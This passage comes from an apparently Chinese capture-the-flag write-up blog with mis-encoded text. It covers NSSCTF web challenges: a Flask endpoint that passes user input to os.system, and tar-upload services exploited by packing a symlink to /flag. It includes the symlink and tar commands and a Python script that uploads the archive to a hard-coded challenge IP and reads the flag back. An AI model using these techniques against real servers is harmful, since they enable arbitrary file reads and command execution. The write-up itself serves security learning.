class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;æ‰«æ‰«æ‰«ï¼Œæ‰«å•¥ä¸œæ–¹æ˜ç å‘¢[æ€’]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¯ä»¥å­¦åˆ°å¾ˆå¤š</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">åå¼¹shellå¤§åˆé›†</a></p><p><a href="https://blog.csdn.net/qq_63169208/article/details/129267023?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000642516800186549329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168000642516800186549329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-129267023-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ShadowFlag&amp;spm=1018.2226.3001.4187">wpæ–‡ç« </a></p><p>è¿™é‡Œçš„è¯å°±æ˜¯åˆ©ç”¨ä¸‹é¢çš„os.systemè¿›è¡Œåå¼¹shellï¼Œå› ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure><p>æœ‰withçš„è¯æ˜¯æ‰“å¼€æ–‡ä»¶åä¼šå…³é—­ï¼Œæ²¡æœ‰withçš„æ˜¯ä¸ä¼šå…³é—­</p><p>æ‰€ä»¥è¯´flag1å°±ä¼šä¸€ç›´å­˜åœ¨åœ¨åå°è¿›ç¨‹é‡Œé¢ï¼Œä¸ä¼šè¢«ç»“æŸ</p><p>åˆ é™¤äº†æ²¡äº‹ï¼Œåœ¨åå°è¿›ç¨‹è¿˜æ˜¯èƒ½çœ‹åˆ°</p><p>è¿™å°±æ˜¯å…¨éƒ¨äº†</p><p><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag">é¢˜ç›®çš„githubåœ°å€</a></p><h2 id="NSSRound-6-Team-check-V1"><a href="#NSSRound-6-Team-check-V1" class="headerlink" title="[NSSRound#6 Team]check(V1)"></a>[NSSRound#6 Team]check(V1)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230328210025627.png" alt="image-20230328210025627"></p><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨äº  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯</strong></p><p>ç”Ÿæˆä¸€ä¸ª<a href="https://so.csdn.net/so/search?q=è½¯é“¾æ¥&amp;spm=1001.2101.3001.7020">è½¯é“¾æ¥</a>ï¼Œé€šè¿‡<code>è½¯é“¾æ¥</code>é“¾æ¥åˆ°<code>/flagæ–‡ä»¶</code>ï¼Œç„¶åå°†è½¯é“¾æ¥æ‰“åŒ…æˆtaræ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶æ—¶ï¼Œç”±äº<code>extractall</code>æå–å‡ºæ¥çš„æ˜¯ä¸€ä¸ªè½¯é“¾æ¥ï¼Œåé¢è¯»å–çš„æ—¶å€™å°±æ˜¯/flagæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag</span><br><span class="line">tar -cvf flag.tar flag</span><br></pre></td></tr></table></figure><p><strong>è½¯é“¾æ¥å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶çš„è¯»å–</strong></p><p>è¿™é‡Œå°±æ˜¯å…ˆé€šè¿‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.open(file_save_path, &quot;r&quot;)</span><br><span class="line">tar.extractall(app.config[&#x27;UPLOAD_FOLDER&#x27;])</span><br></pre></td></tr></table></figure><p>è§£å‹å‹ç¼©åŒ…ï¼Œç„¶åextractallæå–çš„æ˜¯ä¸€ä¸ªè½¯é“¾æ¥ï¼Œåé¢è·Ÿç€çš„æ˜¯æå–å‡ºæ¥çš„flag</p><p>ç„¶ååœ¨è®¿é—®downloadï¼Œå°±æ˜¯å®ç°è¯»å–ä»£ç ï¼Œè¯»å–åˆ°è§£å‹ååå­—ä¸ºflagçš„æ–‡ä»¶</p><p>flag.tar    è§£å‹åâ€”â€”&gt;    flag</p><p><strong>æ‰€ä»¥payloadè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#è¿™é‡Œæ˜¯ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#è¿™é‡Œæ˜¯postæ•°æ®</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><p>taråŒ…åœ¨è‡ªå·±çš„kaliä¸Šç”Ÿæˆ</p><h2 id="NSSRound-6-Team-check-V2"><a href="#NSSRound-6-Team-check-V2" class="headerlink" title="[NSSRound#6 Team]check(V2)"></a>[NSSRound#6 Team]check(V2)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230329111310192.png" alt="image-20230329111310192"></p><p>ä¸Šä¸€é¢˜çš„å‡çº§ç‰ˆ</p><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œcheckv1çš„è¯åªæœ‰ä¸€å¤„ä¸ä¸€æ ·</p><p><img src="../images/image-20230329192945502.png" alt="image-20230329192945502"></p><p><img src="../images/image-20230329192951184.png" alt="image-20230329192951184"></p><p>v1æ˜¯ç”¨rootç”¨æˆ·æ¥æ‰§è¡Œclean.sh</p><p>v2æ˜¯ç”¨æ™®é€šç”¨æˆ·ctfæ¥æ‰§è¡Œclean</p><p> <strong>è¿™é‡Œçš„ä¸åŒå¯èƒ½æ˜¯å› ä¸ºå‡ºé¢˜äººæƒ³çš„è§£æ³•ä¸åŒ</strong></p><p>å› ä¸ºè¿™é‡Œçš„è§£æ³•ç”¨çš„æ˜¯è½¯é“¾æ¥ï¼Œæ‰€ä»¥ä¿®æ”¹è¿™é‡Œçš„å¹¶ä¸å½±å“</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#è¿™é‡Œæ˜¯ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#è¿™é‡Œæ˜¯postæ•°æ®</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-6-Team-check-Revenge"><a href="#NSSRound-6-Team-check-Revenge" class="headerlink" title="[NSSRound#6 Team]check(Revenge)"></a>[NSSRound#6 Team]check(Revenge)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230329193554819.png" alt="image-20230329193554819"></p><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span 